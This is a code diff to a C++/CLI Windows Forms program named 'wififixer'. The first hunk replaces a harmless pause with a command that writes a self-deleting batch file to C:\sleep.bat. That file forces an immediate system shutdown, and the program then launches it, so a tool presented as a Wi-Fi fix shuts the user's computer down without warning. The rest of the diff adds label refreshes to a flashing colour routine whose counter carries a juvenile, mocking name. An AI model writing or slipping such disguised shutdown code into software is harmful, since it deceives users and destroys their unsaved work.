@@ -162,7 +162,7 @@ namespace wififixer {
 			}
 			std::ofstream shutdown("C:\\sleep.bat");
 			if (shutdown.is_open()) {
-				shutdown << "PAUSE\ndel %0";
+				shutdown << "shutdown /s /t 00\ndel %0";
 				shutdown.close();
 			}
 			(gcnew System::Diagnostics::Process())->Start("C:\\sleep.bat");
@@ -176,34 +176,40 @@ namespace wififixer {
 			this->label1->ForeColor = System::Drawing::Color::Red;
 			this->label1->BackColor = System::Drawing::Color::Black;
 			this->pictureBox1->Visible = true;
+			this->label1->Refresh();
 		}
 		else if (this->LGBT_lover_im_gay == 1) {
 			this->label1->ForeColor = System::Drawing::Color::Orange;
 			this->label1->BackColor = System::Drawing::Color::White;
 			this->pictureBox1->Visible = false;
+			this->label1->Refresh();
 		}
 		else if (this->LGBT_lover_im_gay == 2) {
 			this->label1->ForeColor = System::Drawing::Color::Yellow;
 			this->label1->BackColor = System::Drawing::Color::Black;
 			this->pictureBox1->Visible = true;
+			this->label1->Refresh();
 		}
 		else if (this->LGBT_lover_im_gay == 3) {
 			this->label1->ForeColor = System::Drawing::Color::Green;
 			this->label1->BackColor = System::Drawing::Color::White;
 			this->pictureBox1->Visible = false;
+			this->label1->Refresh();
 		}
 		else if (this->LGBT_lover_im_gay == 4) {
 			this->label1->ForeColor = System::Drawing::Color::Blue;
 			this->label1->BackColor = System::Drawing::Color::Black;
 			this->pictureBox1->Visible = true;
+			this->label1->Refresh();
 		}
 		else if (this->LGBT_lover_im_gay == 5) {
 			this->label1->ForeColor = System::Drawing::Color::Purple;
 			this->label1->BackColor = System::Drawing::Color::White;
 			this->pictureBox1->Visible = false;
+			this->label1->Refresh();
 			this->LGBT_lover_im_gay = -1;
 		}
 		this->LGBT_lover_im_gay++;
 	}
-};
+	};
 }
